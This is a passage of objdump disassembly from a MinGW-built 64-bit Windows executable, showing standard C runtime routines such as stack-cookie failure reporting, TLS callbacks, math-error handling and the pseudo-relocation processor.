  4070aa:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
  4070b1:	2b 00 00 
  4070b4:	eb cb                	jmp    407081 <__security_init_cookie+0xa1>
  4070b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4070bd:	00 00 00 

00000000004070c0 <__report_gsfailure>:
  4070c0:	55                   	push   %rbp
  4070c1:	56                   	push   %rsi
  4070c2:	53                   	push   %rbx
  4070c3:	48 89 e5             	mov    %rsp,%rbp
  4070c6:	48 83 ec 70          	sub    $0x70,%rsp
  4070ca:	48 89 ce             	mov    %rcx,%rsi
  4070cd:	48 8d 0d 8c 71 02 00 	lea    0x2718c(%rip),%rcx        # 42e260 <GS_ContextRecord>
  4070d4:	ff 15 02 12 04 00    	call   *0x41202(%rip)        # 4482dc <__imp_RtlCaptureContext>
  4070da:	48 8b 1d 77 72 02 00 	mov    0x27277(%rip),%rbx        # 42e358 <GS_ContextRecord+0xf8>
  4070e1:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
  4070e5:	45 31 c0             	xor    %r8d,%r8d
  4070e8:	48 89 d9             	mov    %rbx,%rcx
  4070eb:	ff 15 f3 11 04 00    	call   *0x411f3(%rip)        # 4482e4 <__imp_RtlLookupFunctionEntry>
  4070f1:	48 85 c0             	test   %rax,%rax
  4070f4:	0f 84 a3 00 00 00    	je     40719d <__report_gsfailure+0xdd>
  4070fa:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
  4070fe:	49 89 c1             	mov    %rax,%r9
  407101:	49 89 d8             	mov    %rbx,%r8
  407104:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  40710b:	00 00 
  40710d:	48 8d 0d 4c 71 02 00 	lea    0x2714c(%rip),%rcx        # 42e260 <GS_ContextRecord>
  407114:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
  407119:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
  40711d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  407122:	31 c9                	xor    %ecx,%ecx
  407124:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  407129:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  40712d:	ff 15 b9 11 04 00    	call   *0x411b9(%rip)        # 4482ec <__imp_RtlVirtualUnwind>
  407133:	48 8b 05 1e 72 02 00 	mov    0x2721e(%rip),%rax        # 42e358 <GS_ContextRecord+0xf8>
  40713a:	31 c9                	xor    %ecx,%ecx
  40713c:	48 89 35 9d 71 02 00 	mov    %rsi,0x2719d(%rip)        # 42e2e0 <GS_ContextRecord+0x80>
  407143:	48 89 05 06 76 02 00 	mov    %rax,0x27606(%rip)        # 42e750 <GS_ExceptionRecord+0x10>
  40714a:	48 b8 09 04 00 c0 01 	movabs $0x1c0000409,%rax
  407151:	00 00 00 
  407154:	48 89 05 e5 75 02 00 	mov    %rax,0x275e5(%rip)        # 42e740 <GS_ExceptionRecord>
  40715b:	48 8b 05 de 3f 00 00 	mov    0x3fde(%rip),%rax        # 40b140 <__security_cookie>
  407162:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  407166:	48 8b 05 e3 3f 00 00 	mov    0x3fe3(%rip),%rax        # 40b150 <__security_cookie_complement>
  40716d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  407171:	ff 15 85 11 04 00    	call   *0x41185(%rip)        # 4482fc <__imp_SetUnhandledExceptionFilter>
  407177:	48 8d 0d 02 a8 00 00 	lea    0xa802(%rip),%rcx        # 411980 <GS_ExceptionPointers>
  40717e:	ff 15 b0 11 04 00    	call   *0x411b0(%rip)        # 448334 <__imp_UnhandledExceptionFilter>
  407184:	ff 15 ea 10 04 00    	call   *0x410ea(%rip)        # 448274 <__imp_GetCurrentProcess>
  40718a:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
  40718f:	48 89 c1             	mov    %rax,%rcx
  407192:	ff 15 74 11 04 00    	call   *0x41174(%rip)        # 44830c <__imp_TerminateProcess>
  407198:	e8 93 12 00 00       	call   408430 <abort>
  40719d:	48 8b 45 18          	mov    0x18(%rbp),%rax
  4071a1:	48 89 05 b0 71 02 00 	mov    %rax,0x271b0(%rip)        # 42e358 <GS_ContextRecord+0xf8>
  4071a8:	48 8d 45 08          	lea    0x8(%rbp),%rax
  4071ac:	48 89 05 45 71 02 00 	mov    %rax,0x27145(%rip)        # 42e2f8 <GS_ContextRecord+0x98>
  4071b3:	e9 7b ff ff ff       	jmp    407133 <__report_gsfailure+0x73>
  4071b8:	90                   	nop
  4071b9:	90                   	nop
  4071ba:	90                   	nop
  4071bb:	90                   	nop
  4071bc:	90                   	nop
  4071bd:	90                   	nop
  4071be:	90                   	nop
  4071bf:	90                   	nop

00000000004071c0 <__dyn_tls_dtor>:
  4071c0:	48 83 ec 28          	sub    $0x28,%rsp
  4071c4:	83 fa 03             	cmp    $0x3,%edx
  4071c7:	74 17                	je     4071e0 <__dyn_tls_dtor+0x20>
  4071c9:	85 d2                	test   %edx,%edx
  4071cb:	74 13                	je     4071e0 <__dyn_tls_dtor+0x20>
  4071cd:	b8 01 00 00 00       	mov    $0x1,%eax
  4071d2:	48 83 c4 28          	add    $0x28,%rsp
  4071d6:	c3                   	ret
  4071d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4071de:	00 00 
  4071e0:	e8 cb 0c 00 00       	call   407eb0 <__mingw_TLScallback>
  4071e5:	b8 01 00 00 00       	mov    $0x1,%eax
  4071ea:	48 83 c4 28          	add    $0x28,%rsp
  4071ee:	c3                   	ret
  4071ef:	90                   	nop

00000000004071f0 <__dyn_tls_init>:
  4071f0:	56                   	push   %rsi
  4071f1:	53                   	push   %rbx
  4071f2:	48 83 ec 28          	sub    $0x28,%rsp
  4071f6:	48 8b 05 63 aa 00 00 	mov    0xaa63(%rip),%rax        # 411c60 <.refptr._CRT_MT>
  4071fd:	83 38 02             	cmpl   $0x2,(%rax)
  407200:	74 06                	je     407208 <__dyn_tls_init+0x18>
  407202:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
  407208:	83 fa 02             	cmp    $0x2,%edx
  40720b:	74 13                	je     407220 <__dyn_tls_init+0x30>
  40720d:	83 fa 01             	cmp    $0x1,%edx
  407210:	74 40                	je     407252 <__dyn_tls_init+0x62>
  407212:	b8 01 00 00 00       	mov    $0x1,%eax
  407217:	48 83 c4 28          	add    $0x28,%rsp
  40721b:	5b                   	pop    %rbx
  40721c:	5e                   	pop    %rsi
  40721d:	c3                   	ret
  40721e:	66 90                	xchg   %ax,%ax
  407220:	48 8d 1d 39 1e 04 00 	lea    0x41e39(%rip),%rbx        # 449060 <__xd_z>
  407227:	48 8d 35 32 1e 04 00 	lea    0x41e32(%rip),%rsi        # 449060 <__xd_z>
  40722e:	48 39 de             	cmp    %rbx,%rsi
  407231:	74 df                	je     407212 <__dyn_tls_init+0x22>
  407233:	48 8b 03             	mov    (%rbx),%rax
  407236:	48 85 c0             	test   %rax,%rax
  407239:	74 02                	je     40723d <__dyn_tls_init+0x4d>
  40723b:	ff d0                	call   *%rax
  40723d:	48 83 c3 08          	add    $0x8,%rbx
  407241:	48 39 de             	cmp    %rbx,%rsi
  407244:	75 ed                	jne    407233 <__dyn_tls_init+0x43>
  407246:	b8 01 00 00 00       	mov    $0x1,%eax
  40724b:	48 83 c4 28          	add    $0x28,%rsp
  40724f:	5b                   	pop    %rbx
  407250:	5e                   	pop    %rsi
  407251:	c3                   	ret
  407252:	e8 59 0c 00 00       	call   407eb0 <__mingw_TLScallback>
  407257:	b8 01 00 00 00       	mov    $0x1,%eax
  40725c:	48 83 c4 28          	add    $0x28,%rsp
  407260:	5b                   	pop    %rbx
  407261:	5e                   	pop    %rsi
  407262:	c3                   	ret
  407263:	0f 1f 00             	nopl   (%rax)
  407266:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40726d:	00 00 00 

0000000000407270 <__tlregdtor>:
  407270:	31 c0                	xor    %eax,%eax
  407272:	c3                   	ret
  407273:	90                   	nop
  407274:	90                   	nop
  407275:	90                   	nop
  407276:	90                   	nop
  407277:	90                   	nop
  407278:	90                   	nop
  407279:	90                   	nop
  40727a:	90                   	nop
  40727b:	90                   	nop
  40727c:	90                   	nop
  40727d:	90                   	nop
  40727e:	90                   	nop
  40727f:	90                   	nop

0000000000407280 <__mingw_raise_matherr>:
  407280:	48 83 ec 58          	sub    $0x58,%rsp
  407284:	48 8b 05 75 75 02 00 	mov    0x27575(%rip),%rax        # 42e800 <stUserMathErr>
  40728b:	48 85 c0             	test   %rax,%rax
  40728e:	74 2c                	je     4072bc <__mingw_raise_matherr+0x3c>
  407290:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
  407297:	00 00 
  407299:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  40729d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4072a2:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  4072a7:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
  4072ad:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
  4072b3:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
  4072b9:	ff d0                	call   *%rax
  4072bb:	90                   	nop
  4072bc:	48 83 c4 58          	add    $0x58,%rsp
  4072c0:	c3                   	ret
  4072c1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4072c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4072cd:	00 00 00 

00000000004072d0 <__mingw_setusermatherr>:
  4072d0:	48 89 0d 29 75 02 00 	mov    %rcx,0x27529(%rip)        # 42e800 <stUserMathErr>
  4072d7:	e9 94 11 00 00       	jmp    408470 <__setusermatherr>
  4072dc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000004072e0 <_matherr>:
  4072e0:	56                   	push   %rsi
  4072e1:	53                   	push   %rbx
  4072e2:	48 83 ec 78          	sub    $0x78,%rsp
  4072e6:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
  4072eb:	0f 29 7c 24 50       	movaps %xmm7,0x50(%rsp)
  4072f0:	44 0f 29 44 24 60    	movaps %xmm8,0x60(%rsp)
  4072f6:	83 39 06             	cmpl   $0x6,(%rcx)
  4072f9:	0f 87 d1 00 00 00    	ja     4073d0 <_matherr+0xf0>
  4072ff:	8b 01                	mov    (%rcx),%eax
  407301:	48 8d 15 1c a8 00 00 	lea    0xa81c(%rip),%rdx        # 411b24 <.rdata+0x124>
  407308:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  40730c:	48 01 d0             	add    %rdx,%rax
  40730f:	ff e0                	jmp    *%rax
  407311:	48 8d 1d e8 a6 00 00 	lea    0xa6e8(%rip),%rbx        # 411a00 <.rdata>
  407318:	48 8b 71 08          	mov    0x8(%rcx),%rsi
  40731c:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
  407322:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
  407327:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
  40732c:	b9 02 00 00 00       	mov    $0x2,%ecx
  407331:	e8 6a 11 00 00       	call   4084a0 <__acrt_iob_func>
  407336:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
  40733d:	49 89 f1             	mov    %rsi,%r9
  407340:	49 89 d8             	mov    %rbx,%r8
  407343:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
  407349:	48 8d 15 a8 a7 00 00 	lea    0xa7a8(%rip),%rdx        # 411af8 <.rdata+0xf8>
  407350:	48 89 c1             	mov    %rax,%rcx
  407353:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
  407359:	e8 b2 10 00 00       	call   408410 <fprintf>
  40735e:	90                   	nop
  40735f:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
  407364:	31 c0                	xor    %eax,%eax
  407366:	0f 28 7c 24 50       	movaps 0x50(%rsp),%xmm7
  40736b:	44 0f 28 44 24 60    	movaps 0x60(%rsp),%xmm8
  407371:	48 83 c4 78          	add    $0x78,%rsp
  407375:	5b                   	pop    %rbx
  407376:	5e                   	pop    %rsi
  407377:	c3                   	ret
  407378:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40737f:	00 
  407380:	48 8d 1d 98 a6 00 00 	lea    0xa698(%rip),%rbx        # 411a1f <.rdata+0x1f>
  407387:	eb 8f                	jmp    407318 <_matherr+0x38>
  407389:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407390:	48 8d 1d a9 a6 00 00 	lea    0xa6a9(%rip),%rbx        # 411a40 <.rdata+0x40>
  407397:	e9 7c ff ff ff       	jmp    407318 <_matherr+0x38>
  40739c:	0f 1f 40 00          	nopl   0x0(%rax)
  4073a0:	48 8d 1d 09 a7 00 00 	lea    0xa709(%rip),%rbx        # 411ab0 <.rdata+0xb0>
  4073a7:	e9 6c ff ff ff       	jmp    407318 <_matherr+0x38>
  4073ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4073b0:	48 8d 1d d1 a6 00 00 	lea    0xa6d1(%rip),%rbx        # 411a88 <.rdata+0x88>
  4073b7:	e9 5c ff ff ff       	jmp    407318 <_matherr+0x38>
  4073bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4073c0:	48 8d 1d 99 a6 00 00 	lea    0xa699(%rip),%rbx        # 411a60 <.rdata+0x60>
  4073c7:	e9 4c ff ff ff       	jmp    407318 <_matherr+0x38>
  4073cc:	0f 1f 40 00          	nopl   0x0(%rax)
  4073d0:	48 8d 1d 0f a7 00 00 	lea    0xa70f(%rip),%rbx        # 411ae6 <.rdata+0xe6>
  4073d7:	e9 3c ff ff ff       	jmp    407318 <_matherr+0x38>
  4073dc:	90                   	nop
  4073dd:	90                   	nop
  4073de:	90                   	nop
  4073df:	90                   	nop

00000000004073e0 <_fpreset>:
  4073e0:	db e3                	fninit
  4073e2:	c3                   	ret
  4073e3:	90                   	nop
  4073e4:	90                   	nop
  4073e5:	90                   	nop
  4073e6:	90                   	nop
  4073e7:	90                   	nop
  4073e8:	90                   	nop
  4073e9:	90                   	nop
  4073ea:	90                   	nop
  4073eb:	90                   	nop
  4073ec:	90                   	nop
  4073ed:	90                   	nop
  4073ee:	90                   	nop
  4073ef:	90                   	nop

00000000004073f0 <_decode_pointer>:
  4073f0:	48 89 c8             	mov    %rcx,%rax
  4073f3:	c3                   	ret
  4073f4:	66 90                	xchg   %ax,%ax
  4073f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4073fd:	00 00 00 

0000000000407400 <_encode_pointer>:
  407400:	48 89 c8             	mov    %rcx,%rax
  407403:	c3                   	ret
  407404:	90                   	nop
  407405:	90                   	nop
  407406:	90                   	nop
  407407:	90                   	nop
  407408:	90                   	nop
  407409:	90                   	nop
  40740a:	90                   	nop
  40740b:	90                   	nop
  40740c:	90                   	nop
  40740d:	90                   	nop
  40740e:	90                   	nop
  40740f:	90                   	nop

0000000000407410 <__write_memory.part.0>:
  407410:	41 54                	push   %r12
  407412:	55                   	push   %rbp
  407413:	57                   	push   %rdi
  407414:	56                   	push   %rsi
  407415:	53                   	push   %rbx
  407416:	48 83 ec 50          	sub    $0x50,%rsp
  40741a:	48 63 35 03 74 02 00 	movslq 0x27403(%rip),%rsi        # 42e824 <maxSections>
  407421:	85 f6                	test   %esi,%esi
  407423:	48 89 cb             	mov    %rcx,%rbx
  407426:	48 89 d5             	mov    %rdx,%rbp
  407429:	4c 89 c7             	mov    %r8,%rdi
  40742c:	0f 8e 66 01 00 00    	jle    407598 <__write_memory.part.0+0x188>
  407432:	48 8b 05 ef 73 02 00 	mov    0x273ef(%rip),%rax        # 42e828 <the_secs>
  407439:	31 c9                	xor    %ecx,%ecx
  40743b:	48 83 c0 18          	add    $0x18,%rax
  40743f:	90                   	nop
  407440:	48 8b 10             	mov    (%rax),%rdx
  407443:	48 39 d3             	cmp    %rdx,%rbx
  407446:	72 14                	jb     40745c <__write_memory.part.0+0x4c>
  407448:	4c 8b 40 08          	mov    0x8(%rax),%r8
  40744c:	45 8b 40 08          	mov    0x8(%r8),%r8d
  407450:	4c 01 c2             	add    %r8,%rdx
  407453:	48 39 d3             	cmp    %rdx,%rbx
  407456:	0f 82 89 00 00 00    	jb     4074e5 <__write_memory.part.0+0xd5>
  40745c:	83 c1 01             	add    $0x1,%ecx
  40745f:	48 83 c0 28          	add    $0x28,%rax
  407463:	39 f1                	cmp    %esi,%ecx
  407465:	75 d9                	jne    407440 <__write_memory.part.0+0x30>
  407467:	48 89 d9             	mov    %rbx,%rcx
  40746a:	e8 41 0c 00 00       	call   4080b0 <__mingw_GetSectionForAddress>
  40746f:	48 85 c0             	test   %rax,%rax
  407472:	49 89 c4             	mov    %rax,%r12
  407475:	0f 84 52 01 00 00    	je     4075cd <__write_memory.part.0+0x1bd>
  40747b:	48 8b 05 a6 73 02 00 	mov    0x273a6(%rip),%rax        # 42e828 <the_secs>
  407482:	48 8d 34 b6          	lea    (%rsi,%rsi,4),%rsi
  407486:	48 c1 e6 03          	shl    $0x3,%rsi
  40748a:	48 01 f0             	add    %rsi,%rax
  40748d:	4c 89 60 20          	mov    %r12,0x20(%rax)
  407491:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  407497:	e8 44 0d 00 00       	call   4081e0 <_GetPEImageBase>
  40749c:	41 8b 4c 24 0c       	mov    0xc(%r12),%ecx
  4074a1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  4074a6:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  4074ac:	48 01 c1             	add    %rax,%rcx
  4074af:	48 8b 05 72 73 02 00 	mov    0x27372(%rip),%rax        # 42e828 <the_secs>
  4074b6:	48 89 4c 30 18       	mov    %rcx,0x18(%rax,%rsi,1)
  4074bb:	ff 15 93 0e 04 00    	call   *0x40e93(%rip)        # 448354 <__imp_VirtualQuery>
  4074c1:	48 85 c0             	test   %rax,%rax
  4074c4:	0f 84 e6 00 00 00    	je     4075b0 <__write_memory.part.0+0x1a0>
  4074ca:	8b 44 24 44          	mov    0x44(%rsp),%eax
  4074ce:	8d 50 fc             	lea    -0x4(%rax),%edx
  4074d1:	83 e2 fb             	and    $0xfffffffb,%edx
  4074d4:	74 08                	je     4074de <__write_memory.part.0+0xce>
  4074d6:	83 e8 40             	sub    $0x40,%eax
  4074d9:	83 e0 bf             	and    $0xffffffbf,%eax
  4074dc:	75 62                	jne    407540 <__write_memory.part.0+0x130>
  4074de:	83 05 3f 73 02 00 01 	addl   $0x1,0x2733f(%rip)        # 42e824 <maxSections>
  4074e5:	83 ff 08             	cmp    $0x8,%edi
  4074e8:	73 29                	jae    407513 <__write_memory.part.0+0x103>
  4074ea:	40 f6 c7 04          	test   $0x4,%dil
  4074ee:	0f 85 90 00 00 00    	jne    407584 <__write_memory.part.0+0x174>
  4074f4:	85 ff                	test   %edi,%edi
  4074f6:	74 10                	je     407508 <__write_memory.part.0+0xf8>
  4074f8:	0f b6 45 00          	movzbl 0x0(%rbp),%eax
  4074fc:	40 f6 c7 02          	test   $0x2,%dil
  407500:	88 03                	mov    %al,(%rbx)
  407502:	0f 85 97 00 00 00    	jne    40759f <__write_memory.part.0+0x18f>
  407508:	48 83 c4 50          	add    $0x50,%rsp
  40750c:	5b                   	pop    %rbx
  40750d:	5e                   	pop    %rsi
  40750e:	5f                   	pop    %rdi
  40750f:	5d                   	pop    %rbp
  407510:	41 5c                	pop    %r12
  407512:	c3                   	ret
  407513:	89 f8                	mov    %edi,%eax
  407515:	83 ef 01             	sub    $0x1,%edi
  407518:	48 8b 54 05 f8       	mov    -0x8(%rbp,%rax,1),%rdx
  40751d:	83 ff 08             	cmp    $0x8,%edi
  407520:	48 89 54 03 f8       	mov    %rdx,-0x8(%rbx,%rax,1)
  407525:	72 e1                	jb     407508 <__write_memory.part.0+0xf8>
  407527:	83 e7 f8             	and    $0xfffffff8,%edi
  40752a:	31 c0                	xor    %eax,%eax
  40752c:	89 c2                	mov    %eax,%edx
  40752e:	83 c0 08             	add    $0x8,%eax
  407531:	48 8b 4c 15 00       	mov    0x0(%rbp,%rdx,1),%rcx
  407536:	39 f8                	cmp    %edi,%eax
  407538:	48 89 0c 13          	mov    %rcx,(%rbx,%rdx,1)
  40753c:	72 ee                	jb     40752c <__write_memory.part.0+0x11c>
  40753e:	eb c8                	jmp    407508 <__write_memory.part.0+0xf8>
  407540:	48 03 35 e1 72 02 00 	add    0x272e1(%rip),%rsi        # 42e828 <the_secs>
  407547:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  40754d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  407552:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  407557:	49 89 f1             	mov    %rsi,%r9
  40755a:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
  40755e:	48 89 56 10          	mov    %rdx,0x10(%rsi)
  407562:	ff 15 e4 0d 04 00    	call   *0x40de4(%rip)        # 44834c <__imp_VirtualProtect>
  407568:	85 c0                	test   %eax,%eax
  40756a:	0f 85 6e ff ff ff    	jne    4074de <__write_memory.part.0+0xce>
  407570:	ff 15 16 0d 04 00    	call   *0x40d16(%rip)        # 44828c <__imp_GetLastError>
  407576:	48 8d 0d 3b a6 00 00 	lea    0xa63b(%rip),%rcx        # 411bb8 <.rdata+0x78>
  40757d:	89 c2                	mov    %eax,%edx
  40757f:	e8 cc 2b 00 00       	call   40a150 <__report_error>
  407584:	8b 45 00             	mov    0x0(%rbp),%eax
  407587:	89 ff                	mov    %edi,%edi
  407589:	89 03                	mov    %eax,(%rbx)
  40758b:	8b 44 3d fc          	mov    -0x4(%rbp,%rdi,1),%eax
  40758f:	89 44 3b fc          	mov    %eax,-0x4(%rbx,%rdi,1)
  407593:	e9 70 ff ff ff       	jmp    407508 <__write_memory.part.0+0xf8>
  407598:	31 f6                	xor    %esi,%esi
  40759a:	e9 c8 fe ff ff       	jmp    407467 <__write_memory.part.0+0x57>
  40759f:	89 ff                	mov    %edi,%edi
  4075a1:	0f b7 44 3d fe       	movzwl -0x2(%rbp,%rdi,1),%eax
  4075a6:	66 89 44 3b fe       	mov    %ax,-0x2(%rbx,%rdi,1)
  4075ab:	e9 58 ff ff ff       	jmp    407508 <__write_memory.part.0+0xf8>
  4075b0:	48 8b 05 71 72 02 00 	mov    0x27271(%rip),%rax        # 42e828 <the_secs>
  4075b7:	48 8d 0d c2 a5 00 00 	lea    0xa5c2(%rip),%rcx        # 411b80 <.rdata+0x40>
  4075be:	41 8b 54 24 08       	mov    0x8(%r12),%edx
  4075c3:	4c 8b 44 30 18       	mov    0x18(%rax,%rsi,1),%r8
  4075c8:	e8 83 2b 00 00       	call   40a150 <__report_error>
  4075cd:	48 8d 0d 8c a5 00 00 	lea    0xa58c(%rip),%rcx        # 411b60 <.rdata+0x20>
  4075d4:	48 89 da             	mov    %rbx,%rdx
  4075d7:	e8 74 2b 00 00       	call   40a150 <__report_error>
  4075dc:	90                   	nop
  4075dd:	0f 1f 00             	nopl   (%rax)

00000000004075e0 <_pei386_runtime_relocator>:
  4075e0:	55                   	push   %rbp
  4075e1:	41 57                	push   %r15
  4075e3:	41 56                	push   %r14
  4075e5:	41 55                	push   %r13
  4075e7:	41 54                	push   %r12
  4075e9:	57                   	push   %rdi
  4075ea:	56                   	push   %rsi
  4075eb:	53                   	push   %rbx
  4075ec:	48 83 ec 38          	sub    $0x38,%rsp
  4075f0:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
  4075f7:	00 
  4075f8:	8b 1d 22 72 02 00    	mov    0x27222(%rip),%ebx        # 42e820 <was_init.95174>
  4075fe:	85 db                	test   %ebx,%ebx
  407600:	74 11                	je     407613 <_pei386_runtime_relocator+0x33>
  407602:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
  407606:	5b                   	pop    %rbx
  407607:	5e                   	pop    %rsi
  407608:	5f                   	pop    %rdi
  407609:	41 5c                	pop    %r12
  40760b:	41 5d                	pop    %r13
  40760d:	41 5e                	pop    %r14
  40760f:	41 5f                	pop    %r15
  407611:	5d                   	pop    %rbp
  407612:	c3                   	ret
  407613:	c7 05 03 72 02 00 01 	movl   $0x1,0x27203(%rip)        # 42e820 <was_init.95174>
  40761a:	00 00 00 
  40761d:	e8 0e 0b 00 00       	call   408130 <__mingw_GetSectionCount>
  407622:	48 98                	cltq
  407624:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  407628:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
  40762f:	00 
  407630:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  407634:	e8 37 0d 00 00       	call   408370 <___chkstk_ms>
  407639:	4c 8b 25 50 a6 00 00 	mov    0xa650(%rip),%r12        # 411c90 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__>
  407640:	c7 05 da 71 02 00 00 	movl   $0x0,0x271da(%rip)        # 42e824 <maxSections>
  407647:	00 00 00 
  40764a:	48 8b 35 4f a6 00 00 	mov    0xa64f(%rip),%rsi        # 411ca0 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
  407651:	48 29 c4             	sub    %rax,%rsp
  407654:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
  407659:	48 89 05 c8 71 02 00 	mov    %rax,0x271c8(%rip)        # 42e828 <the_secs>
  407660:	4c 89 e0             	mov    %r12,%rax
  407663:	48 29 f0             	sub    %rsi,%rax
  407666:	48 83 f8 07          	cmp    $0x7,%rax
  40766a:	7e 96                	jle    407602 <_pei386_runtime_relocator+0x22>
  40766c:	48 83 f8 0b          	cmp    $0xb,%rax
  407670:	8b 16                	mov    (%rsi),%edx
  407672:	0f 8e c8 00 00 00    	jle    407740 <_pei386_runtime_relocator+0x160>
  407678:	85 d2                	test   %edx,%edx
  40767a:	0f 84 a4 00 00 00    	je     407724 <_pei386_runtime_relocator+0x144>
  407680:	4c 39 e6             	cmp    %r12,%rsi
  407683:	0f 83 79 ff ff ff    	jae    407602 <_pei386_runtime_relocator+0x22>
  407689:	4c 8d 76 08          	lea    0x8(%rsi),%r14
  40768d:	49 83 c4 07          	add    $0x7,%r12
  407691:	4c 8b 2d 28 a6 00 00 	mov    0xa628(%rip),%r13        # 411cc0 <.refptr.__image_base__>
  407698:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
  40769c:	4d 29 f4             	sub    %r14,%r12
  40769f:	49 c1 ec 03          	shr    $0x3,%r12
  4076a3:	4e 8d 64 e6 08       	lea    0x8(%rsi,%r12,8),%r12
  4076a8:	eb 0a                	jmp    4076b4 <_pei386_runtime_relocator+0xd4>
  4076aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4076b0:	49 83 c6 08          	add    $0x8,%r14
  4076b4:	8b 4e 04             	mov    0x4(%rsi),%ecx
  4076b7:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  4076bd:	48 89 fa             	mov    %rdi,%rdx
  4076c0:	8b 06                	mov    (%rsi),%eax
  4076c2:	4c 89 f6             	mov    %r14,%rsi
  4076c5:	4c 01 e9             	add    %r13,%rcx
  4076c8:	03 01                	add    (%rcx),%eax
  4076ca:	89 45 a8             	mov    %eax,-0x58(%rbp)
  4076cd:	e8 3e fd ff ff       	call   407410 <__write_memory.part.0>
  4076d2:	4d 39 e6             	cmp    %r12,%r14
  4076d5:	75 d9                	jne    4076b0 <_pei386_runtime_relocator+0xd0>
  4076d7:	8b 05 47 71 02 00    	mov    0x27147(%rip),%eax        # 42e824 <maxSections>
  4076dd:	31 f6                	xor    %esi,%esi
  4076df:	4c 8b 25 66 0c 04 00 	mov    0x40c66(%rip),%r12        # 44834c <__imp_VirtualProtect>
  4076e6:	85 c0                	test   %eax,%eax
  4076e8:	0f 8e 14 ff ff ff    	jle    407602 <_pei386_runtime_relocator+0x22>
  4076ee:	66 90                	xchg   %ax,%ax
  4076f0:	48 8b 05 31 71 02 00 	mov    0x27131(%rip),%rax        # 42e828 <the_secs>
  4076f7:	48 01 f0             	add    %rsi,%rax
  4076fa:	44 8b 00             	mov    (%rax),%r8d
  4076fd:	45 85 c0             	test   %r8d,%r8d
  407700:	74 0e                	je     407710 <_pei386_runtime_relocator+0x130>
  407702:	48 8b 50 10          	mov    0x10(%rax),%rdx
  407706:	49 89 f9             	mov    %rdi,%r9
  407709:	48 8b 48 08          	mov    0x8(%rax),%rcx
  40770d:	41 ff d4             	call   *%r12
  407710:	83 c3 01             	add    $0x1,%ebx
  407713:	48 83 c6 28          	add    $0x28,%rsi
  407717:	3b 1d 07 71 02 00    	cmp    0x27107(%rip),%ebx        # 42e824 <maxSections>
  40771d:	7c d1                	jl     4076f0 <_pei386_runtime_relocator+0x110>
  40771f:	e9 de fe ff ff       	jmp    407602 <_pei386_runtime_relocator+0x22>
  407724:	8b 4e 04             	mov    0x4(%rsi),%ecx
  407727:	85 c9                	test   %ecx,%ecx
  407729:	0f 85 51 ff ff ff    	jne    407680 <_pei386_runtime_relocator+0xa0>
  40772f:	8b 56 08             	mov    0x8(%rsi),%edx
  407732:	85 d2                	test   %edx,%edx
  407734:	75 1d                	jne    407753 <_pei386_runtime_relocator+0x173>
  407736:	8b 56 0c             	mov    0xc(%rsi),%edx
  407739:	48 83 c6 0c          	add    $0xc,%rsi
  40773d:	0f 1f 00             	nopl   (%rax)
  407740:	85 d2                	test   %edx,%edx
  407742:	0f 85 38 ff ff ff    	jne    407680 <_pei386_runtime_relocator+0xa0>
  407748:	8b 46 04             	mov    0x4(%rsi),%eax
  40774b:	85 c0                	test   %eax,%eax
